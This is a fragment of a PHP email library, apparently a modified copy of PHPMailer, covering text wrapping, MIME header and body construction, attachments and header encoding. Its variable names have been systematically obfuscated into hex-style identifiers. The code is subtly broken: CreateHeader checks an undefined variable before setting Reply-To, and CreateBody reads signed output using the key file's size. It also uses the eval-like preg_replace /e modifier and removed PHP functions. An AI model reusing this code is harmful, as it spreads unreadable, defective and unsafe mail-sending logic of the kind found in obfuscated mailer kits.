		$xa0 = ($x9f) ? sprintf(" =%s", $this->LE) : $this->LE;
		// If utf-8 encoding is used, we will need to make sure we don't
		// split multibyte characters when we wrap
		$xa1 = (strtolower($this->CharSet) == "utf-8");

		$x19 = $this->FixEOL($x19);
		if (substr($x19, -1) == $this->LE) {
		  $x19 = substr($x19, 0, -1);
		}

		$x44 = explode($this->LE, $x19);
		$x19 = '';
		for ($x8c=0 ;$x8c < count($x44); $x8c++) {
		  $xa2 = explode(' ', $x44[$x8c]);
		  $xa3 = '';
		  for ($x53 = 0; $x53<count($xa2); $x53++) {
			$xa4 = $xa2[$x53];
			if ($x9f and (strlen($xa4) > $x9e)) {
			  $xa5 = $x9e - strlen($xa3) - 1;
			  if ($x53 != 0) {
				if ($xa5 > 20) {
				  $xa6 = $xa5;
				  if ($xa1) {
					$xa6 = $this->UTF8CharBoundary($xa4, $xa6);
				  } elseif (substr($xa4, $xa6 - 1, 1) == "=") {
					$xa6--;
				  } elseif (substr($xa4, $xa6 - 2, 1) == "=") {
					$xa6 -= 2;
				  }
				  $xa7 = substr($xa4, 0, $xa6);
				  $xa4 = substr($xa4, $xa6);
				  $xa3 .= ' ' . $xa7;
				  $x19 .= $xa3 . sprintf("=%s", $this->LE);
				} else {
				  $x19 .= $xa3 . $xa0;
				}
				$xa3 = '';
			  }
			  while (strlen($xa4) > 0) {
				$xa6 = $x9e;
				if ($xa1) {
				  $xa6 = $this->UTF8CharBoundary($xa4, $xa6);
				} elseif (substr($xa4, $xa6 - 1, 1) == "=") {
				  $xa6--;
				} elseif (substr($xa4, $xa6 - 2, 1) == "=") {
				  $xa6 -= 2;
				}
				$xa7 = substr($xa4, 0, $xa6);
				$xa4 = substr($xa4, $xa6);

				if (strlen($xa4) > 0) {
				  $x19 .= $xa7 . sprintf("=%s", $this->LE);
				} else {
				  $xa3 = $xa7;
				}
			  }
			} else {
			  $xa8 = $xa3;
			  $xa3 .= ($x53 == 0) ? $xa4 : (' ' . $xa4);

			  if (strlen($xa3) > $x9e and $xa8 != '') {
				$x19 .= $xa8 . $xa0;
				$xa3 = $xa4;
			  }
			}
		  }
		  $x19 .= $xa3 . $this->LE;
		}

		return $x19;
	  }

	  /**
	   * Finds last character boundary prior to maxLength in a utf-8
	   * quoted (printable) encoded string.
	   * Original written by Colin Brown.
	   * @access private
	   * @param string $xa9 utf-8 QP text
	   * @param int    $xaa   find last character boundary prior to this length
	   * @return int
	   */
	  function UTF8CharBoundary($xa9, $xaa) {
		$xab = false;
		$xac = 3;
		while (!$xab) {
		  $xad = substr($xa9, $xaa - $xac, $xac);
		  $xae = strpos($xad, "=");
		  if ($xae !== false) {
			// Found start of encoded character byte within $xac block.
			// Check the encoded byte value (the 2 chars after the '=')
			$xaf = substr($xa9, $xaa - $xac + $xae + 1, 2);
			$xb0 = hexdec($xaf);
			if ($xb0 < 128) { // Single byte character.
			  // If the encoded char was found at pos 0, it will fit
			  // otherwise reduce maxLength to start of the encoded char
			  $xaa = ($xae == 0) ? $xaa :
			  $xaa - ($xac - $xae);
			  $xab = true;
			} elseif ($xb0 >= 192) { // First byte of a multi byte character
			  // Reduce maxLength to split at start of character
			  $xaa = $xaa - ($xac - $xae);
			  $xab = true;
			} elseif ($xb0 < 192) { // Middle byte of a multi byte character, look further back
			  $xac += 3;
			}
		  } else {
			// No encoded character found
			$xab = true;
		  }
		}
		return $xaa;
	  }

	  /**
	   * Set the body wrapping.
	   * @access private
	   * @return void
	   */
	  function SetWordWrap() {
		if($this->WordWrap < 1) {
		  return;
		}

		switch($this->message_type) {
		  case 'alt':
			/* fall through */
		  case 'alt_attachments':
			$this->AltBody = $this->WrapText($this->AltBody, $this->WordWrap);
			break;
		  default:
			$this->Body = $this->WrapText($this->Body, $this->WordWrap);
			break;
		}
	  }

	  /**
	   * Assembles message header.
	   * @access private
	   * @return string
	   */
	  function CreateHeader() {
		$x89 = '';

		/* Set the boundaries */
		$xb1 = md5(uniqid(time()));
		$this->boundary[1] = 'b1_' . $xb1;
		$this->boundary[2] = 'b2_' . $xb1;

		$x89 .= $this->HeaderLine('Date', $this->RFCDate());
		if($this->Sender == '') {
		  $x89 .= $this->HeaderLine('Return-Path', trim($this->From));
		} else {
		  $x89 .= $this->HeaderLine('Return-Path', trim($this->Sender));
		}

		/* To be created automatically by mail() */
		if($this->Mailer != 'mail') {
		  if(count($this->to) > 0) {
			$x89 .= $this->AddrAppend('To', $this->to);
		  } elseif (count($this->cc) == 0) {
			$x89 .= $this->HeaderLine('To', 'undisclosed-recipients:;');
		  }
		  if(count($this->cc) > 0) {
			$x89 .= $this->AddrAppend('Cc', $this->cc);
		  }
		}

		$x1b = array();
		$x1b[0][0] = trim($this->From);
		$x1b[0][1] = $this->FromName;
		$x89 .= $this->AddrAppend('From', $x1b);

		/* sendmail and mail() extract Cc from the header before sending */
		if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->cc) > 0)) {
		  $x89 .= $this->AddrAppend('Cc', $this->cc);
		}

		/* sendmail and mail() extract Bcc from the header before sending */
		if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->bcc) > 0)) {
		  $x89 .= $this->AddrAppend('Bcc', $this->bcc);
		}
		if($x22 != "")
		{
		if(count($this->ReplyTo) > 0) {
		  $x89 .= $this->AddrAppend('Reply-To', $this->ReplyTo);
		}
		}
		/* mail() sets the subject itself */
		if($this->Mailer != 'mail') {
		  $x89 .= $this->HeaderLine('Subject', $this->EncodeHeader($this->SecureHeader($this->Subject)));
		}

		if($this->MessageID != '') {
		  $x89 .= $this->HeaderLine('Message-ID',$this->MessageID);
		} else {
		  $x89 .= sprintf("Message-ID: <%s@%s>%s", $xb1, $this->ServerHostname(), $this->LE);
		}
		$x89 .= $this->HeaderLine('X-Priority', $this->Priority);
		if($this->ConfirmReadingTo != '') {
		  $x89 .= $this->HeaderLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>');
		}

		// Add custom headers
		for($x94 = 0; $x94 < count($this->CustomHeader); $x94++) {
		  $x89 .= $this->HeaderLine(trim($this->CustomHeader[$x94][0]), $this->EncodeHeader(trim($this->CustomHeader[$x94][1])));
		}
		if (!$this->sign_key_file) {
		  $x89 .= $this->HeaderLine('MIME-Version', '1.0');
		  $x89 .= $this->GetMailMIME();
		}

		return $x89;
	  }

	  /**
	   * Returns the message MIME.
	   * @access private
	   * @return string
	   */
	  function GetMailMIME() {
		$x89 = '';
		switch($this->message_type) {
		  case 'plain':
			$x89 .= $this->HeaderLine('Content-Transfer-Encoding', $this->Encoding);
			$x89 .= sprintf("Content-Type: %s; charset=\"%s\"", $this->ContentType, $this->CharSet);
			break;
		  case 'attachments':
			/* fall through */
		  case 'alt_attachments':
			if($this->InlineImageExists()){
			  $x89 .= sprintf("Content-Type: %s;%s\ttype=\"text/html\";%s\tboundary=\"%s\"%s", 'multipart/related', $this->LE, $this->LE, $this->boundary[1], $this->LE);
			} else {
			  $x89 .= $this->HeaderLine('Content-Type', 'multipart/mixed;');
			  $x89 .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
			}
			break;
		  case 'alt':
			$x89 .= $this->HeaderLine('Content-Type', 'multipart/alternative;');
			$x89 .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
			break;
		}

		if($this->Mailer != 'mail') {
		  $x89 .= $this->LE.$this->LE;
		}

		return $x89;
	  }

	  /**
	   * Assembles the message body.  Returns an empty string on failure.
	   * @access private
	   * @return string
	   */
	  function CreateBody() {
		$x89 = '';
		if ($this->sign_key_file) {
		  $x89 .= $this->GetMailMIME();
		}

		$this->SetWordWrap();

		switch($this->message_type) {
		  case 'alt':
			$x89 .= $this->GetBoundary($this->boundary[1], '', 'text/plain', '');
			$x89 .= $this->EncodeString($this->AltBody, $this->Encoding);
			$x89 .= $this->LE.$this->LE;
			$x89 .= $this->GetBoundary($this->boundary[1], '', 'text/html', '');
			$x89 .= $this->EncodeString($this->Body, $this->Encoding);
			$x89 .= $this->LE.$this->LE;
			$x89 .= $this->EndBoundary($this->boundary[1]);
			break;
		  case 'plain':
			$x89 .= $this->EncodeString($this->Body, $this->Encoding);
			break;
		  case 'attachments':
			$x89 .= $this->GetBoundary($this->boundary[1], '', '', '');
			$x89 .= $this->EncodeString($this->Body, $this->Encoding);
			$x89 .= $this->LE;
			$x89 .= $this->AttachAll();
			break;
		  case 'alt_attachments':
			$x89 .= sprintf("--%s%s", $this->boundary[1], $this->LE);
			$x89 .= sprintf("Content-Type: %s;%s" . "\tboundary=\"%s\"%s", 'multipart/alternative', $this->LE, $this->boundary[2], $this->LE.$this->LE);
			$x89 .= $this->GetBoundary($this->boundary[2], '', 'text/plain', '') . $this->LE; // Create text body
			$x89 .= $this->EncodeString($this->AltBody, $this->Encoding);
			$x89 .= $this->LE.$this->LE;
			$x89 .= $this->GetBoundary($this->boundary[2], '', 'text/html', '') . $this->LE; // Create the HTML body
			$x89 .= $this->EncodeString($this->Body, $this->Encoding);
			$x89 .= $this->LE.$this->LE;
			$x89 .= $this->EndBoundary($this->boundary[2]);
			$x89 .= $this->AttachAll();
			break;
		}

		if($this->IsError()) {
		  $x89 = '';
		} else if ($this->sign_key_file) {
		  $x29 = tempnam("", "mail");
		  $xb2 = fopen($x29, "w");
		  fwrite($xb2, $x89);
		  fclose($xb2);
		  $xb3 = tempnam("", "signed");

		  if (@openssl_pkcs7_sign($x29, $xb3, "file://".$this->sign_key_file, array("file://".$this->sign_key_file, $this->sign_key_pass), null)) {
			$xb2 = fopen($xb3, "r");
			$x89 = fread($xb2, filesize($this->sign_key_file));
			fclose($xb2);
		  } else {
			$this->SetError($this->Lang("signing").openssl_error_string());
			$x89 = '';
		  }

		  unlink($x29);
		  unlink($xb3);
		}

		return $x89;
	  }

	  /**
	   * Returns the start of a message boundary.
	   * @access private
	   */
	  function GetBoundary($x7e, $xb4, $xb5, $xb6) {
		$x89 = '';
		if($xb4 == '') {
		  $xb4 = $this->CharSet;
		}
		if($xb5 == '') {
		  $xb5 = $this->ContentType;
		}
		if($xb6 == '') {
		  $xb6 = $this->Encoding;
		}
		$x89 .= $this->TextLine('--' . $x7e);
		$x89 .= sprintf("Content-Type: %s; charset = \"%s\"", $xb5, $xb4);
		$x89 .= $this->LE;
		$x89 .= $this->HeaderLine('Content-Transfer-Encoding', $xb6);
		$x89 .= $this->LE;

		return $x89;
	  }

	  /**
	   * Returns the end of a message boundary.
	   * @access private
	   */
	  function EndBoundary($x7e) {
		return $this->LE . '--' . $x7e . '--' . $this->LE;
	  }

	  /**
	   * Sets the message type.
	   * @access private
	   * @return void
	   */
	  function SetMessageType() {
		if(count($this->attachment) < 1 && strlen($this->AltBody) < 1) {
		  $this->message_type = 'plain';
		} else {
		  if(count($this->attachment) > 0) {
			$this->message_type = 'attachments';
		  }
		  if(strlen($this->AltBody) > 0 && count($this->attachment) < 1) {
			$this->message_type = 'alt';
		  }
		  if(strlen($this->AltBody) > 0 && count($this->attachment) > 0) {
			$this->message_type = 'alt_attachments';
		  }
		}
	  }

	  /* Returns a formatted header line.
	   * @access private
	   * @return string
	   */
	  function HeaderLine($x48, $x14) {
		return $x48 . ': ' . $x14 . $this->LE;
	  }

	  /**
	   * Returns a formatted mail line.
	   * @access private
	   * @return string
	   */
	  function TextLine($x14) {
		return $x14 . $this->LE;
	  }

	  /////////////////////////////////////////////////
	  // CLASS METHODS, ATTACHMENTS
	  /////////////////////////////////////////////////

	  /**
	   * Adds an attachment from a path on the filesystem.
	   * Returns false if the file could not be found
	   * or accessed.
	   * @param string $xb7 Path to the attachment.
	   * @param string $x48 Overrides the attachment name.
	   * @param string $xb6 File encoding (see $x5c).
	   * @param string $x9a File extension (MIME) type.
	   * @return bool
	   */
	  function AddAttachment($xb7, $x48 = '', $xb6 = 'base64', $x9a = 'application/octet-stream') {
		if(!@is_file($xb7)) {
		  $this->SetError($this->Lang('file_access') . $xb7);
		  return false;
		}

		$xb8 = basename($xb7);
		if($x48 == '') {
		  $x48 = $xb8;
		}

		$x86 = count($this->attachment);
		$this->attachment[$x86][0] = $xb7;
		$this->attachment[$x86][1] = $xb8;
		$this->attachment[$x86][2] = $x48;
		$this->attachment[$x86][3] = $xb6;
		$this->attachment[$x86][4] = $x9a;
		$this->attachment[$x86][5] = false; // isStringAttachment
		$this->attachment[$x86][6] = 'attachment';
		$this->attachment[$x86][7] = 0;

		return true;
	  }

	  /**
	   * Attaches all fs, string, and binary attachments to the message.
	   * Returns an empty string on failure.
	   * @access private
	   * @return string
	   */
	  function AttachAll() {
		/* Return text of body */
		$xb9 = array();

		/* Add all attachments */
		for($x8c = 0; $x8c < count($this->attachment); $x8c++) {
		  /* Check for string attachment */
		  $xba = $this->attachment[$x8c][5];
		  if ($xba) {
			$x15 = $this->attachment[$x8c][0];
		  } else {
			$xb7 = $this->attachment[$x8c][0];
		  }

		  $xb8    = $this->attachment[$x8c][1];
		  $x48        = $this->attachment[$x8c][2];
		  $xb6    = $this->attachment[$x8c][3];
		  $x9a        = $this->attachment[$x8c][4];
		  $xbb = $this->attachment[$x8c][6];
		  $xbc         = $this->attachment[$x8c][7];

		  $xb9[] = sprintf("--%s%s", $this->boundary[1], $this->LE);
		  $xb9[] = sprintf("Content-Type: %s; name=\"%s\"%s", $x9a, $x48, $this->LE);
		  $xb9[] = sprintf("Content-Transfer-Encoding: %s%s", $xb6, $this->LE);

		  if($xbb == 'inline') {
			$xb9[] = sprintf("Content-ID: <%s>%s", $xbc, $this->LE);
		  }

		  $xb9[] = sprintf("Content-Disposition: %s; filename=\"%s\"%s", $xbb, $x48, $this->LE.$this->LE);

		  /* Encode as string attachment */
		  if($xba) {
			$xb9[] = $this->EncodeString($x15, $xb6);
			if($this->IsError()) {
			  return '';
			}
			$xb9[] = $this->LE.$this->LE;
		  } else {
			$xb9[] = $this->EncodeFile($xb7, $xb6);
			if($this->IsError()) {
			  return '';
			}
			$xb9[] = $this->LE.$this->LE;
		  }
		}

		$xb9[] = sprintf("--%s--%s", $this->boundary[1], $this->LE);

		return join('', $xb9);
	  }

	  /**
	   * Encodes attachment in requested format.  Returns an
	   * empty string on failure.
	   * @access private
	   * @return string
	   */
	  function EncodeFile ($xb7, $xb6 = 'base64') {
		if(!@$xbd = fopen($xb7, 'rb')) {
		  $this->SetError($this->Lang('file_open') . $xb7);
		  return '';
		}
		$xbe = get_magic_quotes_runtime();
		set_magic_quotes_runtime(0);
		$xbf = fread($xbd, filesize($xb7));
		$xbf = $this->EncodeString($xbf, $xb6);
		fclose($xbd);
		set_magic_quotes_runtime($xbe);

		return $xbf;
	  }

	  /**
	   * Encodes string to requested format. Returns an
	   * empty string on failure.
	   * @access private
	   * @return string
	   */
	  function EncodeString ($x12, $xb6 = 'base64') {
		$xc0 = '';
		switch(strtolower($xb6)) {
		  case 'base64':
			/* chunk_split is found in PHP >= 3.0.6 */
			$xc0 = chunk_split(base64_encode($x12), 76, $this->LE);
			break;
		  case '7bit':
		  case '8bit':
			$xc0 = $this->FixEOL($x12);
			if (substr($xc0, -(strlen($this->LE))) != $this->LE)
			  $xc0 .= $this->LE;
			break;
		  case 'binary':
			$xc0 = $x12;
			break;
		  case 'quoted-printable':
			$xc0 = $this->EncodeQP($x12);
			break;
		  default:
			$this->SetError($this->Lang('encoding') . $xb6);
			break;
		}
		return $xc0;
	  }

	  /**
	   * Encode a header string to best of Q, B, quoted or none.
	   * @access private
	   * @return string
	   */
	  function EncodeHeader ($x12, $xc1 = 'text') {
		$xc2 = 0;

		switch (strtolower($xc1)) {
		  case 'phrase':
			if (!preg_match('/[\200-\377]/', $x12)) {
			  /* Can't use addslashes as we don't know what value has magic_quotes_sybase. */
			  $xc0 = addcslashes($x12, "\0..\37\177\\\"");
			  if (($x12 == $xc0) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $x12)) {
				return ($xc0);
			  } else {
				return ("\"$xc0\"");
			  }
			}
			$xc2 = preg_match_all('/[^\040\041\043-\133\135-\176]/', $x12, $xc3);
			break;
		  case 'comment':
			$xc2 = preg_match_all('/[()"]/', $x12, $xc3);
			/* Fall-through */
		  case 'text':
		  default:
			$xc2 += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $x12, $xc3);
			break;
		}

		if ($xc2 == 0) {
		  return ($x12);
		}

		$xc4 = 75 - 7 - strlen($this->CharSet);
		/* Try to select the encoding which should produce the shortest output */
		if (strlen($x12)/3 < $xc2) {
		  $xb6 = 'B';
		  if (function_exists('mb_strlen') && $this->HasMultiBytes($x12)) {
		 // Use a custom function which correctly encodes and wraps long
		 // multibyte strings without breaking lines within a character
			$xc0 = $this->Base64EncodeWrapMB($x12);
		  } else {
			$xc0 = base64_encode($x12);
			$xc4 -= $xc4 % 4;
			$xc0 = trim(chunk_split($xc0, $xc4, "\n"));
		  }
		} else {
		  $xb6 = 'Q';
		  $xc0 = $this->EncodeQ($x12, $xc1);
		  $xc0 = $this->WrapText($xc0, $xc4, true);
		  $xc0 = str_replace('='.$this->LE, "\n", trim($xc0));
		}

		$xc0 = preg_replace('/^(.*)$/m', " =?".$this->CharSet."?$xb6?\\1?=", $xc0);
		$xc0 = trim(str_replace("\n", $this->LE, $xc0));

		return $xc0;
	  }

	  /**
	   * Checks if a string contains multibyte characters.
	   * @access private
	   * @param string $x12 multi-byte text to wrap encode
	   * @return bool
	   */
	  function HasMultiBytes($x12) {
		if (function_exists('mb_strlen')) {
		  return (strlen($x12) > mb_strlen($x12, $this->CharSet));
		} else { // Assume no multibytes (we can't handle without mbstring functions anyway)
		  return False;
		}
	  }

	  /**
	   * Correctly encodes and wraps long multibyte strings for mail headers
	   * without breaking lines within a character.
	   * Adapted from a function by paravoid at http://uk.php.net/manual/en/function.mb-encode-mimeheader.php
	   * @access private
	   * @param string $x12 multi-byte text to wrap encode
	   * @return string
	   */
	  function Base64EncodeWrapMB($x12) {
		$xc5 = "=?".$this->CharSet."?B?";
		$xc6 = "?=";
		$xc0 = "";

		$xc7 = mb_strlen($x12, $this->CharSet);
		// Each line must have length <= 75, including $xc5 and $xc6
		$x9e = 75 - strlen($xc5) - strlen($xc6);
		// Average multi-byte ratio
		$xc8 = $xc7 / strlen($x12);
		// Base64 has a 4:3 ratio
		$xc9 = $xca = floor($x9e * $xc8 * .75);

		for ($x8c = 0; $x8c < $xc7; $x8c += $xc9) {
		  $xac = 0;

		  do {
			$xc9 = $xca - $xac;
			$xcb = mb_substr($x12, $x8c, $xc9, $this->CharSet);
			$xcb = base64_encode($xcb);
			$xac++;
		  }
		  while (strlen($xcb) > $x9e);

		  $xc0 .= $xcb . $this->LE;
		}

		// Chomp the last linefeed
		$xc0 = substr($xc0, 0, -strlen($this->LE));
		return $xc0;
	  }

	  /**
	   * Encode string to quoted-printable.
	   * @access private
	   * @return string
	   */
	  function EncodeQP( $xcc = '', $xcd = 76, $xce = false ) {
		$xaf = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
		$x40 = preg_split('/(?:\r\n|\r|\n)/', $xcc);
		$xcf = "\r\n";
		$xd0 = '=';
		$xd1 = '';
		while( list(, $x44) = each($x40) ) {
		  $xd2 = strlen($x44);
		  $xd3 = '';
		  for($x8c = 0; $x8c < $xd2; $x8c++) {
			$xd4 = substr( $x44, $x8c, 1 );
			$xb0 = ord( $xd4 );
			if ( ( $x8c == 0 ) && ( $xb0 == 46 ) ) { // convert first point in the line into =2E
			  $xd4 = '=2E';
			}
			if ( $xb0 == 32 ) {
			  if ( $x8c == ( $xd2 - 1 ) ) { // convert space at eol only
				$xd4 = '=20';
			  } else if ( $xce ) {
				$xd4 = '=20';
			  }
			} elseif ( ($xb0 == 61) || ($xb0 < 32 ) || ($xb0 > 126) ) { // always encode "\t", which is *not* required
			  $xd5 = floor($xb0/16);
			  $xd6 = floor($xb0%16);
			  $xd4 = $xd0.$xaf[$xd5].$xaf[$xd6];
			}
			if ( (strlen($xd3) + strlen($xd4)) >= $xcd ) { // CRLF is not counted
			  $xd1 .= $xd3.$xd0.$xcf; //  soft line break; " =\r\n" is okay
			  $xd3 = '';
			  // check if newline first character will be point or not
			  if ( $xb0 == 46 ) {
				$xd4 = '=2E';
			  }
			}
			$xd3 .= $xd4;
		  } // end of for
		  $xd1 .= $xd3.$xcf;
		} // end of while
		return trim($xd1);
	  }

	  /**
	   * Encode string to q encoding.
	   * @access private
	   * @return string
	   */
	  function EncodeQ ($x12, $xc1 = 'text') {
		/* There should not be any EOL in the string */
		$xc0 = preg_replace("[\r\n]", '', $x12);

		switch (strtolower($xc1)) {
		  case 'phrase':
			$xc0 = preg_replace("/([^A-Za-z0-9!*+\/ -])/e", "'='.sprintf('%02X', ord('\\1'))", $xc0);
			break;
		  case 'comment':
			$xc0 = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('\\1'))", $xc0);
		  case 'text':
		  default:
			/* Replace every high ascii, control =, ? and _ characters */
			$xc0 = preg_replace('/([\000-\011\013\014\016-\037\075\077\137\177-\377])/e',
				  "'='.sprintf('%02X', ord('\\1'))", $xc0);
			break;
		}

		/* Replace every spaces to _ (more readable than =20) */
		$xc0 = str_replace(' ', '_', $xc0);

		return $xc0;
	  }

	  /**
	   * Adds a string or binary attachment (non-filesystem) to the list.
	   * This method can be used to attach ascii or binary data,
	   * such as a BLOB record from a database.
	   * @param string $x15 String attachment data.
	   * @param string $xb8 Name of the attachment.
	   * @param string $xb6 File encoding (see $x5c).
	   * @param string $x9a File extension (MIME) type.
	   * @return void
	   */
	  function AddStringAttachment($x15, $xb8, $xb6 = 'base64', $x9a = 'application/octet-stream') {
		/* Append to $x7b array */
		$x86 = count($this->attachment);
		$this->attachment[$x86][0] = $x15;
		$this->attachment[$x86][1] = $xb8;
		$this->attachment[$x86][2] = $xb8;
		$this->attachment[$x86][3] = $xb6;
		$this->attachment[$x86][4] = $x9a;
		$this->attachment[$x86][5] = true; // isString
		$this->attachment[$x86][6] = 'attachment';
		$this->attachment[$x86][7] = 0;
	  }

	  /**
	   * Adds an embedded attachment.  This can include images, sounds, and
	   * just about any other document.  Make sure to set the $x9a to an
	   * image type.  For JPEG images use "image/jpeg" and for GIF images
	   * use "image/gif".
	   * @param string $xb7 Path to the attachment.
	   * @param string $xbc Content ID of the attachment.  Use this to identify
	   *        the Id for accessing the image in an HTML form.
	   * @param string $x48 Overrides the attachment name.
	   * @param string $xb6 File encoding (see $x5c).
	   * @param string $x9a File extension (MIME) type.
	   * @return bool
	   */
	  function AddEmbeddedImage($xb7, $xbc, $x48 = '', $xb6 = 'base64', $x9a = 'application/octet-stream') {

		if(!@is_file($xb7)) {
		  $this->SetError($this->Lang('file_access') . $xb7);
		  return false;
		}

		$xb8 = basename($xb7);
		if($x48 == '') {
		  $x48 = $xb8;
		}

		/* Append to $x7b array */
		$x86 = count($this->attachment);
		$this->attachment[$x86][0] = $xb7;
		$this->attachment[$x86][1] = $xb8;
		$this->attachment[$x86][2] = $x48;
		$this->attachment[$x86][3] = $xb6;
		$this->attachment[$x86][4] = $x9a;
		$this->attachment[$x86][5] = false;
		$this->attachment[$x86][6] = 'inline';
		$this->attachment[$x86][7] = $xbc;

		return true;
	  }

	  /**
	   * Returns true if an inline attachment is present.
	   * @access private
	   * @return bool
	   */
	  function InlineImageExists() {
		$x89 = false;
		for($x8c = 0; $x8c < count($this->attachment); $x8c++) {
		  if($this->attachment[$x8c][6] == 'inline') {
			$x89 = true;
			break;
		  }
		}

		return $x89;
	  }

	  /////////////////////////////////////////////////
	  // CLASS METHODS, MESSAGE RESET
	  /////////////////////////////////////////////////

	  /**
	   * Clears all recipients assigned in the TO array.  Returns void.
	   * @return void
	   */
	  function ClearAddresses() {
		$this->to = array();
	  }

	  /**
	   * Clears all recipients assigned in the CC array.  Returns void.
	   * @return void
	   */
	  function ClearCCs() {
		$this->cc = array();
	  }

	  /**
	   * Clears all recipients assigned in the BCC array.  Returns void.
	   * @return void
	   */
	  function ClearBCCs() {
		$this->bcc = array();
	  }

	  /**
	   * Clears all recipients assigned in the ReplyTo array.  Returns void.
	   * @return void
	   */
	  function ClearReplyTos() {
		$this->ReplyTo = array();
	  }

	  /**
	   * Clears all recipients assigned in the TO, CC and BCC
	   * array.  Returns void.
	   * @return void
	   */
	  function ClearAllRecipients() {
		$this->to = array();
		$this->cc = array();
		$this->bcc = array();
	  }

	  /**
	   * Clears all previously set filesystem, string, and binary
	   * attachments.  Returns void.
	   * @return void
	   */
	  function ClearAttachments() {
		$this->attachment = array();
	  }

	  /**
	   * Clears all custom headers.  Returns void.
	   * @return void
	   */
	  function ClearCustomHeaders() {
		$this->CustomHeader = array();
	  }

	  /////////////////////////////////////////////////
	  // CLASS METHODS, MISCELLANEOUS
	  /////////////////////////////////////////////////

	  /**
	   * Adds the error message to the error container.
	   * Returns void.
	   * @access private
	   * @return void
	   */
	  function SetError($xd7) {
		$this->error_count++;
		$this->ErrorInfo = $xd7;
	  }

	  /**
	   * Returns the proper RFC 822 formatted date.
	   * @access private
	   * @return string
	   */
	  function RFCDate() {
		$xd8 = date('Z');
		$xd9 = ($xd8 < 0) ? '-' : '+';
		$xd8 = abs($xd8);
		$xd8 = (int)($xd8/3600)*100 + ($xd8%3600)/60;
		$x89 = sprintf("%s %s%04d", date('D, j M Y H:i:s'), $xd9, $xd8);

		return $x89;
	  }

	  /**
	   * Returns the appropriate server variable.  Should work with both
	   * PHP 4.1.0+ as well as older versions.  Returns an empty string
	   * if nothing is found.
	   * @access private
	   * @return mixed
	   */
	  function ServerVar($xda) {
		global $xdb;
		global $xdc;

		if(!isset($_SERVER)) {
		  $_SERVER = $xdb;
		  if(!isset($_SERVER['REMOTE_ADDR'])) {
			$_SERVER = $xdc; // must be Apache
		  }
		}

		if(isset($_SERVER[$xda])) {
		  return $_SERVER[$xda];
		} else {
		  return '';
		}
	  }

	  /**
	   * Returns the server hostname or 'localhost.localdomain' if unknown.
	   * @access private
	   * @return string
	   */
	  function ServerHostname() {
		if ($this->Hostname != '') {
		  $x89 = $this->Hostname;
		} elseif ($this->ServerVar('SERVER_NAME') != '') {
		  $x89 = $this->ServerVar('SERVER_NAME');
		} else {
		  $x89 = 'localhost.localdomain';
		}

		return $x89;
	  }

	  /**
	   * Returns a message in the appropriate language.
	   * @access private
	   * @return string
	   */
	  function Lang($x13) {
		if(count($this->language) < 1) {
		  $this->SetLanguage('en'); // set the default language
		}

		if(isset($this->language[$x13])) {
		  return $this->language[$x13];
		} else {
		  return 'Language string failed to load: ' . $x13;
		}
	  }

	  /**
	   * Returns true if an error occurred.
	   * @return bool
	   */
	  function IsError() {
		return ($this->error_count > 0);
	  }

	  /**
	   * Changes every end of line from CR or LF to CRLF.
	   * @access private
	   * @return string
	   */
	  function FixEOL($x12) {
		$x12 = str_replace("\r\n", "\n", $x12);
		$x12 = str_replace("\r", "\n", $x12);
		$x12 = str_replace("\n", $this->LE, $x12);
		return $x12;
	  }

	  /**
	   * Adds a custom header.
	   * @return void
	   */
	  function AddCustomHeader($xdd) {
		$this->CustomHeader[] = explode(':', $xdd, 2);
	  }

	  /**
	   * Evaluates the message and returns modifications for inline images and backgrounds
	   * @access public
	   * @return $x19
	   */
	  function MsgHTML($x19,$xde='') {
		preg_match_all("/(src|background)=\"(.*)\"/Ui", $x19, $xdf);
		if(isset($xdf[2])) {
		  foreach($xdf[2] as $x8c => $x0f) {
			// do not change urls for absolute images (thanks to corvuscorax)
			if (!preg_match('/^[A-z][A-z]*:\/\//',$x0f)) {
			  $xb8 = basename($x0f);
			  $xe0 = dirname($x0f);
			  ($xe0 == '.')?$xe0='':'';
			  $xbc = 'cid:' . md5($xb8);
			  $xe1 = split("\.", $xb8);
			  $xe2 = $xe1[1];
			  $xe3 = $this->_mime_types($xe2);
			  if ( strlen($xde) > 1 && substr($xde,-1) != '/') { $xde .= '/'; }
			  if ( strlen($xe0) > 1 && substr($xde,-1) != '/') { $xe0 .= '/'; }
			  $this->AddEmbeddedImage($xde.$xe0.$xb8, md5($xb8), $xb8, 'base64', $xe3);
			  if ( $this->AddEmbeddedImage($xde.$xe0.$xb8, md5($xb8), $xb8, 'base64',$xe3) ) {
				$x19 = preg_replace("/".$xdf[1][$x8c]."=\"".preg_quote($x0f, '/')."\"/Ui", $xdf[1][$x8c]."=\"".$xbc."\"", $x19);
			  }
			}
		  }
		}
		$this->IsHTML(true);
		$this->Body = $x19;
		$xe4 = trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/s','',$x19)));
		if ( !empty($xe4) && empty($this->AltBody) ) {
		  $this->AltBody = $xe4;
		}
		if ( empty($this->AltBody) ) {
		  $this->AltBody = 'To view this email message, open the email in with HTML compatibility!' . "\n\n";
		}
	  }

	  /**
	   * Gets the mime type of the embedded or inline image
	   * @access private
	   * @return mime type of ext
	   */
	  function _mime_types($xe2 = '') {
		$xe5 = array(
		  'hqx'  =>  'application/mac-binhex40',
		  'cpt'   =>  'application/mac-compactpro',
		  'doc'   =>  'application/msword',
		  'bin'   =>  'application/macbinary',
		  'dms'   =>  'application/octet-stream',
		  'lha'   =>  'application/octet-stream',
		  'lzh'   =>  'application/octet-stream',
		  'exe'   =>  'application/octet-stream',
		  'class' =>  'application/octet-stream',
		  'psd'   =>  'application/octet-stream',
		  'so'    =>  'application/octet-stream',
		  'sea'   =>  'application/octet-stream',
		  'dll'   =>  'application/octet-stream',
		  'oda'   =>  'application/oda',
		  'pdf'   =>  'application/pdf',
		  'ai'    =>  'application/postscript',
		  'eps'   =>  'application/postscript',
		  'ps'    =>  'application/postscript',
		  'smi'   =>  'application/smil',
		  'smil'  =>  'application/smil',
		  'mif'   =>  'application/vnd.mif',
